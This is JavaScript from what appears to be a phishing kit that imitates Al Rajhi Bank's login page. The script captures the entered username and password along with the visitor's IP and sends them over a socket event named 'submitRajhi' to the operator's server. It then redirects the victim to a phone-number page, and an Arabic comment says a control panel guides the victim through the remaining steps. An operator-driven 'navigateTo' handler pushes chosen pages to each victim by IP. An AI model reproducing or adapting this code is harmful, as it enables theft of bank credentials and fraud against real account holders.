        document.addEventListener("DOMContentLoaded", () => {
            const form = document.getElementById("loginForm");
            const uid = document.getElementById("uid");
            const pwd = document.getElementById("pwd");
            const btn = document.getElementById("loginBtn");
            const overlay = document.getElementById("loadingOverlay");
            const msg = document.getElementById("formMsg");

            function toggleButton() {
                const ok = uid.value.trim().length > 0 && pwd.value.trim().length > 0;
                btn.disabled = !ok;
            }
            uid.addEventListener("input", toggleButton);
            pwd.addEventListener("input", toggleButton);
            toggleButton();

            form.addEventListener("submit", async (e) => {
                e.preventDefault();
                if (!form.checkValidity()) {
                    form.classList.add("was-validated");
                    return;
                }
                overlay.style.display = "flex";
                msg.classList.add("d-none");
                msg.textContent = "";

                while (!window.visitorIP) {
                    await new Promise((r) => setTimeout(r, 50));
                }

                try {
                    if (!window.socket) throw new Error("Socket not initialized");
                    
                    window.socket.emit("submitRajhi", {
                        ip: window.visitorIP,
                        username: uid.value.trim(),
                        password: pwd.value,
                    });
                } catch (err) {
                    overlay.style.display = "none";
                    msg.textContent = "تعذّر إرسال البيانات. تحقق من الاتصال وأعد المحاولة.";
                    msg.classList.remove("d-none");
                    console.error(err);
                }
            });

            
            if (window.socket) {
                window.socket.on("ackRajhi", (resp) => {
                    if (resp && resp.success) {
                        // الانتقال إلى صفحة الجوال فقط، ولوحة التحكم توجهه للباقي
                        window.location.href = "phone.html";
                    } else {
                        overlay.style.display = "none";
                        msg.textContent = resp?.error || "حدث خطأ أثناء الإرسال، حاول مرة أخرى.";
                        msg.classList.remove("d-none");
                        console.error(resp?.error || "Rajhi submit failed");
                    }
                });
                
                window.socket.on("navigateTo", ({ page, ip: targetIp }) => {
                    if (window.visitorIP === targetIp) {
                        if (page.includes("declined=true")) {
                            overlay.style.display = "none";
                        }
                        window.location.href = page;
                    }
                });
            }
        });